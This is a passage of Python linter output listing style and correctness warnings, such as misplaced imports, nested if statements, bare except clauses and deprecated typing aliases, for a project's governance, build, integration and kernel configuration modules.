   |                ^^^^
62 |         return await self.repository.list(offset, limit)
   |
help: Replace with `list`

E402 Module level import not at top of file
  --> governance\ai-mutation-governance-firewall\services.py:71:1
   |
71 | import asyncio  # for create_task in process_proposal
   | ^^^^^^^^^^^^^^
   |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> governance\existential_proof.py:265:9
    |
263 |       ) -> InvariantViolation | None:
264 |           """Check temporal consistency (no time-travel)"""
265 | /         if isinstance(current_value, (int, float)) and isinstance(
266 | |             expected_value, (int, float)
267 | |         ):
268 | |             if current_value < expected_value:
    | |______________________________________________^
269 |                   return InvariantViolation(
270 |                       violation_id=self._generate_violation_id("temporal_consistency"),
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> governance\singularity_override.py:626:17
    |
625 |                   # Verify chain
626 | /                 if previous_hash is not None:
627 | |                     if record_dict["previous_hash"] != previous_hash:
    | |_____________________________________________________________________^
628 |                           issues.append(f"Record {i} chain broken")
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> governance\sovereign_runtime.py:505:17
    |
504 |                   # Verify chain
505 | /                 if previous_hash is not None:
506 | |                     if block["previous_hash"] != previous_hash:
    | |_______________________________________________________________^
507 |                           issues.append(f"Block {i} chain broken")
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> governance\sovereign_verifier.py:129:17
    |
128 |                   # Verify chain linkage
129 | /                 if previous_hash is not None:
130 | |                     if block["previous_hash"] != previous_hash:
    | |_______________________________________________________________^
131 |                           result["issues"].append(f"Block {i}: chain broken")
132 |                           continue
    |
help: Combine `if` statements using `and`

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\__init__.py:1:1

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\api\__init__.py:1:1

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\audit\__init__.py:1:1

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\capsules\__init__.py:1:1

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\cognition\__init__.py:1:1

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\constitutional\__init__.py:1:1

N818 Exception name `BuildActionViolation` should be named with an Error suffix
  --> gradle-evolution\constitutional\enforcer.py:19:7
   |
19 | class BuildActionViolation(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^
20 |     """Raised when a build action violates constitutional policy."""
   |

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\db\__init__.py:1:1

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:19:1
   |
17 | sys.path.insert(0, str(project_root))
18 |
19 | from gradle_evolution.api.documentation_generator import DocumentationGenerator
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 | from gradle_evolution.api.verifiability_api import VerifiabilityAPI
21 | from gradle_evolution.audit.accountability import AccountabilityManager
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:20:1
   |
19 | from gradle_evolution.api.documentation_generator import DocumentationGenerator
20 | from gradle_evolution.api.verifiability_api import VerifiabilityAPI
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
21 | from gradle_evolution.audit.accountability import AccountabilityManager
22 | from gradle_evolution.audit.audit_integration import BuildAuditIntegration
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:21:1
   |
19 | from gradle_evolution.api.documentation_generator import DocumentationGenerator
20 | from gradle_evolution.api.verifiability_api import VerifiabilityAPI
21 | from gradle_evolution.audit.accountability import AccountabilityManager
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 | from gradle_evolution.audit.audit_integration import BuildAuditIntegration
23 | from gradle_evolution.capsules.capsule_engine import BuildCapsuleEngine
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:22:1
   |
20 | from gradle_evolution.api.verifiability_api import VerifiabilityAPI
21 | from gradle_evolution.audit.accountability import AccountabilityManager
22 | from gradle_evolution.audit.audit_integration import BuildAuditIntegration
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 | from gradle_evolution.capsules.capsule_engine import BuildCapsuleEngine
24 | from gradle_evolution.cognition.build_cognition import BuildCognitionEngine
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:23:1
   |
21 | from gradle_evolution.audit.accountability import AccountabilityManager
22 | from gradle_evolution.audit.audit_integration import BuildAuditIntegration
23 | from gradle_evolution.capsules.capsule_engine import BuildCapsuleEngine
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 | from gradle_evolution.cognition.build_cognition import BuildCognitionEngine
25 | from gradle_evolution.cognition.state_integration import BuildStateManager
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:24:1
   |
22 | from gradle_evolution.audit.audit_integration import BuildAuditIntegration
23 | from gradle_evolution.capsules.capsule_engine import BuildCapsuleEngine
24 | from gradle_evolution.cognition.build_cognition import BuildCognitionEngine
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 | from gradle_evolution.cognition.state_integration import BuildStateManager
26 | from gradle_evolution.constitutional.enforcer import BuildPolicyEnforcer
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:25:1
   |
23 | from gradle_evolution.capsules.capsule_engine import BuildCapsuleEngine
24 | from gradle_evolution.cognition.build_cognition import BuildCognitionEngine
25 | from gradle_evolution.cognition.state_integration import BuildStateManager
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
26 | from gradle_evolution.constitutional.enforcer import BuildPolicyEnforcer
27 | from gradle_evolution.constitutional.engine import ConstitutionalEngine
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:26:1
   |
24 | from gradle_evolution.cognition.build_cognition import BuildCognitionEngine
25 | from gradle_evolution.cognition.state_integration import BuildStateManager
26 | from gradle_evolution.constitutional.enforcer import BuildPolicyEnforcer
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
27 | from gradle_evolution.constitutional.engine import ConstitutionalEngine
28 | from gradle_evolution.security.policy_scheduler import PolicyScheduler
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:27:1
   |
25 | from gradle_evolution.cognition.state_integration import BuildStateManager
26 | from gradle_evolution.constitutional.enforcer import BuildPolicyEnforcer
27 | from gradle_evolution.constitutional.engine import ConstitutionalEngine
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
28 | from gradle_evolution.security.policy_scheduler import PolicyScheduler
29 | from gradle_evolution.security.security_engine import SecurityEngine
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:28:1
   |
26 | from gradle_evolution.constitutional.enforcer import BuildPolicyEnforcer
27 | from gradle_evolution.constitutional.engine import ConstitutionalEngine
28 | from gradle_evolution.security.policy_scheduler import PolicyScheduler
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 | from gradle_evolution.security.security_engine import SecurityEngine
   |

E402 Module level import not at top of file
  --> gradle-evolution\gradle_integration.py:29:1
   |
27 | from gradle_evolution.constitutional.engine import ConstitutionalEngine
28 | from gradle_evolution.security.policy_scheduler import PolicyScheduler
29 | from gradle_evolution.security.security_engine import SecurityEngine
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
30 |
31 | logging.basicConfig(
   |

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\ir\__init__.py:1:1

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> gradle-evolution\ir\compiler.py:154:13
    |
153 |         except yaml.YAMLError as e:
154 |             raise CompilationError(f"YAML parsing error: {e}", source_file=source_file)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
155 |         except Exception as e:
156 |             if isinstance(e, CompilationError):
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> gradle-evolution\ir\compiler.py:158:13
    |
156 |             if isinstance(e, CompilationError):
157 |                 raise
158 |             raise CompilationError(f"Compilation error: {e}", source_file=source_file)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
159 |
160 |     def _validate_intent_schema(self, intent: dict[str, Any]) -> None:
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\ir\compiler.py:300:13
    |
299 |               # Check compile nodes
300 | /             if node.opcode == IROpcode.COMPILE:
301 | |                 if "source" not in node.attributes:
    | |___________________________________________________^
302 |                       self.errors.append(
303 |                           CompilationError(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\ir\compiler.py:310:13
    |
309 |               # Check test nodes
310 | /             if node.opcode == IROpcode.TEST:
311 | |                 if "suite" not in node.attributes:
    | |__________________________________________________^
312 |                       self.warnings.append(
313 |                           f"Test action at line {node.line_number} has no 'suite' attribute"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\ir\compiler.py:317:13
    |
316 |               # Check loops for termination
317 | /             if node.opcode == IROpcode.LOOP:
318 | |                 if "max_iterations" not in node.attributes:
    | |___________________________________________________________^
319 |                       self.warnings.append(
320 |                           f"Loop at line {node.line_number} has no max_iterations - may not terminate"
    |
help: Combine `if` statements using `and`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> gradle-evolution\ir\ir_executor.py:215:17
    |
213 |                 execution_order = graph.topological_sort()
214 |             except ValueError as e:
215 |                 raise ExecutionError(f"Cannot determine execution order: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
216 |
217 |             # Execute nodes in order
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> gradle-evolution\ir\ir_executor.py:257:13
    |
255 |             if isinstance(e, ExecutionError):
256 |                 raise
257 |             raise ExecutionError(str(e), trace=self.trace)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
258 |
259 |     def _execute_node(self, node: IRNode, graph: IRGraph) -> Any:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> gradle-evolution\ir\ir_executor.py:340:13
    |
339 |           except Exception as e:
340 | /             raise ExecutionError(
341 | |                 f"Node execution failed: {e}", node_id=node.id, trace=self.trace
342 | |             )
    | |_____________^
343 |
344 |       def _execute_sequence(self, node: IRNode, graph: IRGraph) -> Any:
    |

SIM116 Use a dictionary instead of consecutive `if` statements
   --> gradle-evolution\ir\ir_executor.py:486:9
    |
484 |           a, b = inputs[0], inputs[1]
485 |
486 | /         if op == "==":
487 | |             return a == b
488 | |         elif op == "!=":
489 | |             return a != b
490 | |         elif op == "<":
491 | |             return a < b
492 | |         elif op == "<=":
493 | |             return a <= b
494 | |         elif op == ">":
495 | |             return a > b
496 | |         elif op == ">=":
497 | |             return a >= b
498 | |         else:
499 | |             return False
    | |________________________^
500 |
501 |       def _execute_read_file(self, node: IRNode) -> str:
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\ir\ir_schema.py:107:9
    |
105 |           if self.base_type != other.base_type:
106 |               return False
107 | /         if self.base_type == IRType.LIST:
108 | |             if self.element_type and other.element_type:
    | |________________________________________________________^
109 |                   return (
110 |                       self.element_type == other.element_type
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\ir\ir_schema.py:439:9
    |
437 |                       f"Conditional node {node.id} requires at least 1 input"
438 |                   )
439 | /         elif node.opcode == IROpcode.LOOP:
440 | |             if "max_iterations" not in node.attributes:
    | |_______________________________________________________^
441 |                   self.warnings.append(f"Loop node {node.id} has no max_iterations bound")
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\ir\optimizer.py:401:13
    |
400 |               # Pattern: x / x = 1 (if x != 0)
401 | /             elif node.opcode == IROpcode.DIV and len(node.inputs) == 2:
402 | |                 if node.inputs[0] == node.inputs[1]:
    | |____________________________________________________^
403 |                       # Conservative: only optimize if we can prove non-zero
404 |                       node.opcode = IROpcode.CONST
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\ir\optimizer.py:432:17
    |
431 |                   # Check if all inputs are from outside loop
432 | /                 if all(inp_id not in loop_body for inp_id in body_node.inputs):
433 | |                     if body_node.is_pure():  # Only hoist pure operations
    | |___________________________________________^
434 |                           invariant_nodes.append(body_node_id)
    |
help: Combine `if` statements using `and`

N999 Invalid module name: 'gradle-evolution'
--> gradle-evolution\security\__init__.py:1:1

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\security\policy_scheduler.py:186:17
    |
184 |               for _policy_id, scheduled in list(self.scheduled_policies.items()):
185 |                   # Check for activation
186 | /                 if not scheduled.is_active and now >= scheduled.activation_time:
187 | |                     if self._check_conditions(scheduled.conditions):
    | |____________________________________________________________________^
188 |                           await self._activate_policy(scheduled)
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> gradle-evolution\security\policy_scheduler.py:191:17
    |
190 |                   # Check for expiration
191 | /                 if scheduled.is_active and scheduled.expiration_time:
192 | |                     if now >= scheduled.expiration_time:
    | |________________________________________________________^
193 |                           await self._deactivate_policy(scheduled)
    |
help: Combine `if` statements using `and`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> integrations\openclaw\api_endpoints.py:90:9
   |
89 |     except Exception as e:
90 |         raise HTTPException(status_code=500, detail=str(e))
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

E402 Module level import not at top of file
   --> integrations\openclaw\capability_registry.py:624:1
    |
623 | # Import for type hints
624 | from pydantic import BaseModel
    | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> integrations\openclaw\eed_memory.py:131:13
    |
130 |         except aiohttp.ClientError as e:
131 |             raise EEDError(f"Network error storing conversation: {str(e)}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
132 |
133 |     async def retrieve_context(
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> integrations\openclaw\eed_memory.py:172:13
    |
171 |         except aiohttp.ClientError as e:
172 |             raise EEDError(f"Network error retrieving context: {str(e)}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
173 |
174 |     def _parse_context_window(self, data: dict[str, Any]) -> ContextWindow:
    |

E722 Do not use bare `except`
   --> integrations\openclaw\eed_memory.py:252:9
    |
250 |                 return results
251 |
252 |         except:
    |         ^^^^^^
253 |             return []
    |

E722 Do not use bare `except`
   --> integrations\openclaw\eed_memory.py:276:9
    |
274 |             ) as response:
275 |                 return response.status == 200
276 |         except:
    |         ^^^^^^
277 |             return False
    |

E722 Do not use bare `except`
   --> integrations\openclaw\eed_memory.py:306:9
    |
304 |             ) as response:
305 |                 return response.status == 200
306 |         except:
    |         ^^^^^^
307 |             return False
    |

E722 Do not use bare `except`
   --> integrations\openclaw\eed_memory.py:331:9
    |
330 |                 return await response.json()
331 |         except:
    |         ^^^^^^
332 |             return {}
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> integrations\openclaw\legion_api.py:187:9
    |
186 |     except Exception as e:
187 |         raise HTTPException(status_code=500, detail=f"Legion error: {str(e)}")
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> integrations\openclaw\triumvirate_client.py:120:13
    |
119 |         except aiohttp.ClientError as e:
120 |             raise TriumvirateError(f"Network error contacting Triumvirate: {str(e)}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
121 |         except TimeoutError:
122 |             raise TriumvirateError(f"Triumvirate decision timed out after {timeout}s")
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> integrations\openclaw\triumvirate_client.py:122:13
    |
120 |             raise TriumvirateError(f"Network error contacting Triumvirate: {str(e)}")
121 |         except TimeoutError:
122 |             raise TriumvirateError(f"Triumvirate decision timed out after {timeout}s")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
123 |
124 |     def _parse_decision(self, data: dict[str, Any]) -> GovernanceDecision:
    |

E722 Do not use bare `except`
   --> integrations\openclaw\triumvirate_client.py:163:9
    |
161 |             ) as response:
162 |                 return response.status == 200
163 |         except:
    |         ^^^^^^
164 |             return False
    |

E722 Do not use bare `except`
   --> integrations\openclaw\triumvirate_client.py:187:9
    |
185 |                 data = await response.json()
186 |                 return [self._parse_decision(d) for d in data.get("decisions", [])]
187 |         except:
    |         ^^^^^^
188 |             return []
    |

E402 Module level import not at top of file
  --> integrations\thirsty_lang_complete\demo.py:24:1
   |
22 | print("-" * 70)
23 |
24 | from tarl import TarlRuntime
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 | from tarl.policies.default import DEFAULT_POLICIES
   |

E402 Module level import not at top of file
  --> integrations\thirsty_lang_complete\demo.py:25:1
   |
24 | from tarl import TarlRuntime
25 | from tarl.policies.default import DEFAULT_POLICIES
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
26 |
27 | runtime = TarlRuntime(DEFAULT_POLICIES)
   |

E402 Module level import not at top of file
   --> integrations\thirsty_lang_complete\demo.py:150:1
    |
148 | print("-" * 70)
149 |
150 | import time
    | ^^^^^^^^^^^
151 |
152 | # Benchmark TARL policy evaluation
    |

F401 `tarl` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> integrations\thirsty_lang_complete\test_integration.py:127:20
    |
125 |             sys.path.insert(0, str(Path.cwd()))
126 |
127 |             import tarl
    |                    ^^^^
128 |             from tarl import TarlDecision, TarlPolicy, TarlRuntime, TarlVerdict
    |
help: Remove unused import: `tarl`

F401 `tarl.TarlDecision` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> integrations\thirsty_lang_complete\test_integration.py:128:30
    |
127 |             import tarl
128 |             from tarl import TarlDecision, TarlPolicy, TarlRuntime, TarlVerdict
    |                              ^^^^^^^^^^^^
129 |
130 |             # Test basic initialization
    |
help: Remove unused import

F401 `tarl.TarlPolicy` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> integrations\thirsty_lang_complete\test_integration.py:128:44
    |
127 |             import tarl
128 |             from tarl import TarlDecision, TarlPolicy, TarlRuntime, TarlVerdict
    |                                            ^^^^^^^^^^
129 |
130 |             # Test basic initialization
    |
help: Remove unused import

F401 `tarl.TarlVerdict` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> integrations\thirsty_lang_complete\test_integration.py:128:69
    |
127 |             import tarl
128 |             from tarl import TarlDecision, TarlPolicy, TarlRuntime, TarlVerdict
    |                                                                     ^^^^^^^^^^^
129 |
130 |             # Test basic initialization
    |
help: Remove unused import

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> integrations\thirsty_lang_complete\test_integration.py:136:13
    |
135 |         except ImportError as e:
136 |             raise ImportError(f"Failed to import TARL: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
137 |
138 |     def test_tarl_policy_evaluation(self):
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> integrations\thirsty_lang_complete\test_integration.py:236:17
    |
234 |                     ast.parse(f.read())
235 |             except SyntaxError as e:
236 |                 raise SyntaxError(f"unified-security.py has syntax error: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
237 |
238 |     def test_shell_script_executable(self):
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> integrations\thirsty_lang_complete\test_integration.py:266:13
    |
265 |         except json.JSONDecodeError as e:
266 |             raise ValueError(f"MANIFEST.json is not valid JSON: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
267 |
268 |     def test_examples_exist(self):
    |

F401 `rich.live.Live` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> kernel\advanced_visualizations.py:18:27
   |
16 |     from rich.console import Console
17 |     from rich.layout import Layout
18 |     from rich.live import Live
   |                           ^^^^
19 |     from rich.panel import Panel
20 |     from rich.table import Table
   |
help: Remove unused import: `rich.live.Live`

F401 [*] `dataclasses.field` imported but unused
  --> kernel\config.py:21:36
   |
19 | import os
20 | import threading
21 | from dataclasses import dataclass, field
   |                                    ^^^^^
22 | from enum import Enum
23 | from pathlib import Path
   |
help: Remove unused import: `dataclasses.field`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> kernel\config.py:24:1
   |
22 | from enum import Enum
23 | from pathlib import Path
24 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 |
26 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> kernel\config.py:24:1
   |
22 | from enum import Enum
23 | from pathlib import Path
24 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 |
26 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> kernel\config.py:24:1
   |
22 | from enum import Enum
23 | from pathlib import Path
24 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 |
26 | logger = logging.getLogger(__name__)
   |

UP045 [*] Use `X | None` for type annotations
  --> kernel\config.py:46:24
   |
44 |     source: str  # file path or "env" or "default"
45 |     last_modified: float
46 |     validation_schema: Optional[Dict] = None
   |                        ^^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\config.py:46:33
   |
44 |     source: str  # file path or "env" or "default"
45 |     last_modified: float
46 |     validation_schema: Optional[Dict] = None
   |                                 ^^^^
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> kernel\config.py:73:36
   |
71 |     """
72 |
73 |     def __init__(self, config_dir: Optional[str] = None):
   |                                    ^^^^^^^^^^^^^
74 |         # Configuration storage
75 |         self.config: Dict[str, ConfigValue] = {}
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\config.py:75:22
   |
73 |     def __init__(self, config_dir: Optional[str] = None):
74 |         # Configuration storage
75 |         self.config: Dict[str, ConfigValue] = {}
   |                      ^^^^
76 |
77 |         # Configuration directory
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\config.py:81:28
   |
80 |         # Loaded files
81 |         self.loaded_files: List[Path] = []
   |                            ^^^^
82 |
83 |         # Change callbacks
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\config.py:84:32
   |
83 |         # Change callbacks
84 |         self.change_callbacks: Dict[str, List[Callable]] = {}
   |                                ^^^^
85 |
86 |         # Change history (audit trail)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\config.py:84:42
   |
83 |         # Change callbacks
84 |         self.change_callbacks: Dict[str, List[Callable]] = {}
   |                                          ^^^^
85 |
86 |         # Change history (audit trail)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\config.py:87:30
   |
86 |         # Change history (audit trail)
87 |         self.change_history: List[ConfigChange] = []
   |                              ^^^^
88 |
89 |         # Schema definitions
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\config.py:90:23
   |
89 |         # Schema definitions
90 |         self.schemas: Dict[str, Dict] = {}
   |                       ^^^^
91 |
92 |         # Thread safety
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\config.py:90:33
   |
89 |         # Schema definitions
90 |         self.schemas: Dict[str, Dict] = {}
   |                                 ^^^^
91 |
92 |         # Thread safety
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\config.py:96:29
   |
95 |         # File watchers (for hot-reload)
96 |         self.file_watchers: Dict[Path, float] = {}  # path -> last_mtime
   |                             ^^^^
97 |
98 |         # Default values
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\config.py:99:24
    |
 98 |         # Default values
 99 |         self.defaults: Dict[str, Any] = {}
    |                        ^^^^
100 |
101 |         logger.info(
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\config.py:105:49
    |
103 |         )
104 |
105 |     def load_file(self, file_path: str, format: Optional[ConfigFormat] = None):
    |                                                 ^^^^^^^^^^^^^^^^^^^^^^
106 |         """
107 |         Load configuration from file
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\config.py:159:21
    |
158 |     def _load_nested_config(
159 |         self, data: Dict, source: str, timestamp: float, prefix: str = ""
    |                     ^^^^
160 |     ):
161 |         """Recursively load nested configuration"""
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\config.py:263:13
    |
262 |               # Validate if schema exists
263 | /             if key in self.schemas:
264 | |                 if not self._validate_value(key, value):
    | |________________________________________________________^
265 |                       raise ValueError(f"Value for {key} failed schema validation")
    |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\config.py:282:49
    |
280 |             self.defaults[key] = value
281 |
282 |     def register_schema(self, key: str, schema: Dict):
    |                                                 ^^^^
283 |         """
284 |         Register validation schema for configuration key
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\config.py:420:26
    |
418 |             return changed
419 |
420 |     def get_all(self) -> Dict[str, Any]:
    |                          ^^^^
421 |         """Get all configuration as flat dict"""
422 |         with self.lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\config.py:425:29
    |
423 |             return {key: cv.value for key, cv in self.config.items()}
424 |
425 |     def get_nested(self) -> Dict[str, Any]:
    |                             ^^^^
426 |         """Get all configuration as nested dict"""
427 |         with self.lock:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\config.py:448:39
    |
446 |             return json.dumps(self.get_nested(), indent=2)
447 |
448 |     def get_change_history(self, key: Optional[str] = None) -> List[ConfigChange]:
    |                                       ^^^^^^^^^^^^^
449 |         """Get configuration change history"""
450 |         with self.lock:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\config.py:448:64
    |
446 |             return json.dumps(self.get_nested(), indent=2)
447 |
448 |     def get_change_history(self, key: Optional[str] = None) -> List[ConfigChange]:
    |                                                                ^^^^
449 |         """Get configuration change history"""
450 |         with self.lock:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\config.py:455:44
    |
453 |             return self.change_history.copy()
454 |
455 |     def _parse_yaml(self, content: str) -> Dict:
    |                                            ^^^^
456 |         """Parse YAML content (simplified - use PyYAML in production)"""
457 |         # Simplified YAML parser - real implementation would use PyYAML
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\config.py:466:44
    |
464 |             return json.loads(content)
465 |
466 |     def _parse_toml(self, content: str) -> Dict:
